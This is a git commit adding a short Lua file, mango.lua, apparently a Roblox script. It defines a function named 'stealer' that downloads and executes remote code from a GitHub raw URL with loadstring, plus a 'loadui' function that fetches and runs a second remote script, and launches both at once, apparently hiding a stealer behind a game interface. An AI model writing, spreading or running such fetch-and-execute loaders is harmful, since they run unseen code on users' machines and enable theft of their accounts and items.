fe62541ce1497052744c37f204bf95c016d192c7
leonix <furkan62.bakir@gmail.com>
2025-06-24 16:32:58 +0300

    Create mango.lua

---
+++ mango.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/adoptttme/refs/heads/main/adm.lua'))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/opepeb/refs/heads/main/adad.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
